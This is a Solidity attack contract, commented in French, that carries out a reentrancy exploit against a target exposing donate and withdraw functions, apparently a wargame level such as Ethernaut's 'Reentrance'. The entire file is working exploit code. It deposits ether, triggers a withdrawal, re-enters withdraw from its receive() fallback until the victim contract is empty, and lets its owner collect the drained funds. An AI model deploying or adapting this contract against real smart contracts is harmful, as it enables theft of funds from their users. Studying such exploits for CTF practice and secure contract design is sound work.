// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256);

    function withdraw(uint256 _amount) external;
}

contract Reentrancy {
    IReentrance public reentrance;
    uint256 public storedAmount; // montant mémorisé entre les appels
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor(address _reentranceAddress) {
        owner = msg.sender;
        reentrance = IReentrance(_reentranceAddress);
    }

    // Étape 1 : déposer pour obtenir un solde légitime
    function donate() external payable {
        storedAmount = msg.value;
        reentrance.donate{value: msg.value}(address(this));
    }

    // Étape 2 : déclencher le premier withdraw
    function attack() external {
        reentrance.withdraw(storedAmount);
    }

    // Étape 3 : boucle de réentrance
    receive() external payable {
        uint256 victimBalance = address(reentrance).balance;
        if (victimBalance > 0) {
            reentrance.withdraw(storedAmount);
        }
    }

    function collect() external onlyOwner {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}
